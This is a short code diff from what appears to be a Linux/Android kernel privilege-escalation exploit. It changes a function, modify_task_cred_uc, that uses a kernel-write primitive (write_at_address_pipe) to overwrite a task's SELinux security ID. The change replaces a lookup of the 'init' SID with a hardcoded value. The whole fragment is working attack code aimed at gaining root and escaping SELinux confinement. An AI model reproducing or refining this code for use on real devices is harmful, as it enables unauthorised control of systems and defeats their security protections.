@@ -4,7 +4,6 @@
 #include <inttypes.h>
 
 #include "threadinfo.h"
-#include "sid.h"
 
 #define __user
 #define __kernel
@@ -125,7 +124,7 @@ int modify_task_cred_uc(struct thread_info* __kernel info)
 			&& tss.keycreate_sid == 0
 			&& tss.sockcreate_sid == 0)
 		{
-			unsigned int sid = get_sid("init");
+			unsigned int sid = 1;
 			if(sid)
 			{
 				write_at_address_pipe(&security->osid, &sid, sizeof(security->osid));
